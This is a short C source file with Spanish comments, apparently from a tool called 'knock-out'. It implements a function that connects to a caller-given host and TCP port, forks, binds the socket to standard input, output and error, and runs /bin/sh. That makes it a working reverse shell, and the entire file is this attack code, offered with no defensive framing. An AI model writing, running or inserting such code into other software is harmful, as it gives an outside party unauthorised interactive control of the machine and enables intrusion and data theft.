/* Funcion para enviar una shell al puerto tcp (segundo argumento) del host
 * especificado (primer argumento).
 *
 * nitr0us
 */
#include"knock-out.h"

void Reverse(const char *host, unsigned short puerto)
{
	struct sockaddr_in	hostinfo;
	int			sockfd;
	pid_t			pid;

	bzero(&hostinfo, sizeof(hostinfo));

	hostinfo.sin_family	= AF_INET;
	hostinfo.sin_port	= htons(puerto);
	if(!inet_aton(host, &hostinfo.sin_addr)){
		fprintf(stderr, "inet_aton() @ Reverse()\n");
		exit(EXIT_FAILURE);
	}

	if((sockfd = socket(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1)
		error_n(errno, "socket() @ Reverse()");

	if(connect(sockfd, (struct sockaddr *)&hostinfo, sizeof(hostinfo)) == -1)
		error_n(errno, "connect() @ Reverse()");

	debugprint("Conectado con \"%s\"\n", host);

	if((pid = fork()) == -1)
		error_n(errno, "fork() @ Reverse()");
	else if(pid == 0){ // Hijo, envia una shell
		debugprint("Proceso hijo creado [PID: %d]\n", getpid());
		debugprint("Enviando /bin/sh al puerto %d\n", puerto);

		dup2(sockfd, 0);
		dup2(sockfd, 1);
		dup2(sockfd, 2);
		execl("/bin/sh", "sh", NULL);
		error_n(errno, "execl() @ Reverse()");
	}

	close(sockfd);
	// Padre, termina la funcion y regresa.
}
